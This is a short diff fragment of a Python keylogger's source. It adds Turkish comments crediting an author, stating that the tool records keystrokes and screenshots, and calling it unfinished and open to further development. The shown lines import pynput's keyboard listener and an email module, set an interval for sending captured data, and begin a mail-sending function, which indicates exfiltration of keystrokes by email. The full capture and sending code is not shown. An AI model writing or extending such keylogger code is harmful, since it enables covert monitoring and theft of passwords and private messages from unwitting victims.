@@ -6,6 +6,10 @@ from time import sleep
 from email.message import EmailMessage
 from pynput.keyboard import Key,KeyCode,Listener
 
+#Bendeniz SemsYapar kodlamıştır
+#Keyloggerımızın screenshot ve klavye kaydı özellikleri mevcuttur
+#son hali değildir geliştirilmeye ve değiştirlemye açıktır
+
 data=""
 count=10#veri aktarımı aralığını saniye olarak ifade eder isteğe bağlı olarak değiştirilebilir
 def mail_at():
